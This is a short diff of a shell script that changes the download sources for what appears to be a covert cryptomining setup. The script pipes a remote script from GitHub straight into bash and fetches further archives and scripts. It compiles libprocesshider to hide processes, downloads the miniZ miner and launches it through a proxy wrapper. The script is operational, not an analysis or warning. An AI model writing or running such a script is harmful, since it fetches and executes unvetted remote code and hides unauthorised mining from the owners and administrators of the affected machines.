@@ -1,5 +1,5 @@
-wget -O - https://raw.githubusercontent.com/KebonKalapa/ETC/main/px_2.sh | bash
-wget https://github.com/KebonKalapa/ETC/raw/main/magicMin.zip
+wget -O - https://raw.githubusercontent.com/17mei2022/sept22/main/px_2.sh | bash
+wget https://github.com/17mei2022/sept22/raw/main/magicMin.zip
 unzip magicMin.zip
 make
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
@@ -9,6 +9,6 @@ wget https://github.com/miniZ-miner/miniZ/releases/download/v1.8z/miniZ_v1.8z_li
 tar -xvzf miniZ_v1.8z_linux-x64.tar.gz
 rm .gitignore
 cd 1.8z
-wget https://raw.githubusercontent.com/KebonKalapa/ETC/main/min_flex.sh
+wget https://raw.githubusercontent.com/17mei2022/sept22/main/min_flex.sh
 chmod +x *.sh
 graftcp ./min_flex.sh
